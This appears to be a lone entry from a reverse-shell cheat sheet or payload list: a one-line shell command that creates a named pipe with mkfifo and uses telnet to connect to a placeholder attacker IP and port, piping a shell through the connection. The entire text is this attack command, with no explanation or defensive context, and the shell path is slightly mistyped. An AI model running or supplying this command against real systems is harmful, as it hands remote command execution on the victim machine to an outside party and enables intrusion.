TF=$(mktemp -u); mkfifo $TF && telnet <attacker ip> <attacker port> 0<$TF | /bin sh 1>$TF